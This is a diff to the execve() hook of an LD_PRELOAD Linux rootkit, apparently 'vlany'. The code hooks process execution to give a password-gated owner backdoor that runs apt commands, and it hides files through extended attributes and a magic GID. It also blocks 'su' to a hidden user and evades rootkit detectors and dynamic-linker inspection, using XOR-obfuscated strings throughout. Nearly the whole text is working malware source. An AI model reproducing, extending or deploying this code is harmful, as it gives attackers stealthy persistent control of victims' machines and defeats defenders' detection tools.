@@ -30,7 +30,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
             // is in fact the fully authorized owner of the rootkit. allow them access to the execve commands :)
             if(!strcmp(argv[1], execve_pw))
             {
-                // the three functions relative to file hiding
+                // the TWO functions relative to file hiding
                 HOOK(old_setxattr, CSETXATTR);
                 HOOK(old_removexattr, CREMOVEXATTR);
 
@@ -56,6 +56,8 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                         exit(0);
                     }
 
+                    printf("running ./apt with option %s\n", argv[2]);
+
                     // warnings, etc
                     // thinking about making a macro to xor strings, print them and clean up
                     // 23/10/2016 done lol^^
@@ -79,23 +81,26 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     if(!strcmp(argv[2], apt_update))
                     {
                         char *apt_update_cmd = strdup(APT_UPDATE_CMD); xor(apt_update_cmd);
-                        system(apt_update_cmd);
+                        int sret = system(apt_update_cmd);
                         CLEAN(apt_update_cmd);
+                        printf("return value of system() for apt_update condition: %d\n", sret);
                     }else if(!strcmp(argv[2], apt_install))
                     {
                         char apt_install_c[64], *apt_install_cmd = strdup(APT_INSTALL_CMD); xor(apt_install_cmd);
                         snprintf(apt_install_c, sizeof(apt_install_c), apt_install_cmd, argv[3]);
                         CLEAN(apt_install_cmd);
-                        system(apt_install_c);
+                        int sret = system(apt_install_c);
+                        printf("return value of system() for apt_install condition: %d\n", sret);
                     }else if(!strcmp(argv[2], apt_remove))
                     {
                         char apt_rm_c[64], *apt_remove_cmd = strdup(APT_REMOVE_CMD); xor(apt_remove_cmd);
                         snprintf(apt_rm_c, sizeof(apt_rm_c), apt_remove_cmd, argv[3]);
                         CLEAN(apt_remove_cmd);
-                        system(apt_rm_c);
+                        int sret = system(apt_rm_c);
+                        printf("return value of system() for apt_remove condition: %d\n", sret);
                     }
 
-                    old_setgid(MAGIC_GID); // was the user in a hidden directory? we need to reset the magic GID just in case.
+                    old_setgid(MAGIC_GID); // reset the magic GID so we can hide again :3
                     char *apt_success = strdup(APT_SUCCESS); xor(apt_success);
                     printf("%s", apt_success);
                     CLEAN(apt_success);
@@ -205,6 +210,10 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         return old_execve(filename, argv, envp);
     }
 
+    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
+    if(strstr(filename, "su") && !strcmp(argv[1], vlany_user) && strlen(vlany_user) == strlen(argv[1])) { CLEAN(vlany_user); errno = EIO; return -1; }
+    CLEAN(vlany_user);
+
     if(hidden_xattr(filename)) { errno = ENOENT; return -1; }
 
     // we need to hide from rootkit detection tools. in order to do this, we'll remove ourself during the checks, and then
@@ -218,31 +227,13 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     for(i = 0; i < GPSIZE; i++)
     {
         char *gpstr = strdup(gay_procs_list[i]); xor(gpstr);
-
-        // as of 23/10/2016, I'm now using goto statements as it's much neater than what I previously had in place here
-
         int check_curr_proc = hide_vlany(filename, gpstr, ret);
-        if(check_curr_proc == 1) goto CLEAN_EXIT;
-        else if(check_curr_proc == 0) goto IOERR;
-        else if(check_curr_proc == -1) goto ERROR;
-        else if(check_curr_proc == 2) goto CONTINUE;
+        CLEAN(gpstr);
 
-CLEAN_EXIT:
-    CLEAN(gpstr);
-    exit(0);
-
-IOERR:
-    errno = EIO;
-    CLEAN(gpstr);
-    return -1;
-
-ERROR:
-    CLEAN(gpstr);
-    return -1;
-
-CONTINUE:
-    CLEAN(gpstr);
-    return old_execve(filename, argv, envp);
+        if(check_curr_proc == 1) exit(0);
+        else if(check_curr_proc == 0) { errno = EIO; return -1; }
+        else if(check_curr_proc == -1) return -1;
+        else if(check_curr_proc == 2) return old_execve(filename, argv, envp);
     }
 
     char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
@@ -317,7 +308,7 @@ CONTINUE:
     char *ld_preload_env = strdup(LD_PRELOAD_ENV); xor(ld_preload_env);
     for(i = 0; envp[i] != NULL; i++)
     {
-        if(getenv(ld_preload_env) && (strstr(envp[i], libc_path) || strstr(envp[i], "reality.so"))) // don't look at me!! i'm naked!! lol @ skids using Jynx's reality.so smh foh
+        if(getenv(ld_preload_env) && strstr(envp[i], libc_path)) // don't look at me!! i'm naked!!
         {
             CLEAN(ld_preload_env); CLEAN(libc_path);
             errno = EPERM; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
@@ -332,7 +323,7 @@ CONTINUE:
         char *lib_name = strdup(LIB_NAME); xor(lib_name);
         for(i = 0; argv[i] != NULL; i++)
         {
-            if(strstr(argv[i], lib_name)) // strstr and not strcmp because it could be a full path
+            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-2")) // strstr and not strcmp because it could be a full path
             {
                 CLEAN(lib_name);
                 errno = EIO;
@@ -347,15 +338,7 @@ CONTINUE:
     {
         for(i = 0; argv[i] != NULL; i++)
         {
-            if(!strcmp(argv[i], "-static")) // trying to statically compile a binary.. eww
-            {
-                // This works and removes the -static flag from the gcc execution but for some reason gcc throws a "not found error" with an empty string
-                // printf("gcc -static flag detected. overwriting -static flag\n");
-                // strncpy(argv[i], "", strlen(argv[i]));
-                // printf("-static flag overwritten\n");
-                // For now, let's just return a kernel memory error
-                // Sigh...
-
+            if(!strcmp(argv[i], "-static")){
                 errno = ENOMEM;
                 return -1;
             }
